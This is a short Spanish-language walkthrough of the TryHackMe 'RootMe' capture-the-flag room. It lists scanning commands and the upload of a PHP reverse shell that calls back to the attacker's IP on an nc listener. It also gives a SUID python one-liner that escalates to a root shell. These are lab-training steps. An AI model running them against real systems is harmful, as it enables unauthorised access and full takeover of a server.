# Sala RootMe - Guía Rápida de Pasos y Comandos

Pasos para completar la sala "RootMe" de TryHackMe.

## 1. Reconocimiento

*   Realizar un escaneo inicial de puertos y servicios:
    ```bash
    nmap -sV $TARGET
    ```
*   Ejecutar un escaneo más detallado con enumeración mediante scripts, guardando la salida:
    ```bash
    nmap -sC -sV -oA rootme.txt $TARGET
    ```
*   Descubrir directorios web para encontrar puntos de subida:
    ```bash
    gobuster dir --url http://10.10.XXX.XXX/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
    ```
    *(Esto debería identificar un panel de subida y el directorio `/uploads/`)*

## 2. Obtener una Shell

*   Preparar una reverse shell en PHP (de PentestMonkey: [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)).
*   Actualizar el script de la shell con tu IP de `tun0` y el puerto `1234`.
*   Subir la shell a través del panel web.
*   Iniciar un listener:
    ```bash
    nc -l -v -n -p 1234
    ```
*   Activar la shell accediendo al archivo subido en `/uploads/`.
*   Mejorar la shell básica:
    ```bash
    python -c "import pty; pty.spawn('/bin/bash')"
    ```
*   Encontrar la bandera de usuario:
    ```bash
    find / -type f -name user.txt 2>/dev/null
    ```
    *(Luego usar `cat` sobre el archivo)*

## 3. Escalar Privilegios

*   Buscar binarios SUID:
    ```bash
    find / -type f -perm -4000 2>/dev/null
    ```
    *(Identificar `/usr/bin/python` como SUID)*
*   Usar GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) para el exploit SUID de Python.
*   Navegar a `/usr/bin` y ejecutar:
    ```bash
    ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
*   Verificar el acceso root:
    ```bash
    whoami
    ```
    *(El resultado debe ser `root`)*
*   Localizar y leer `root.txt`.
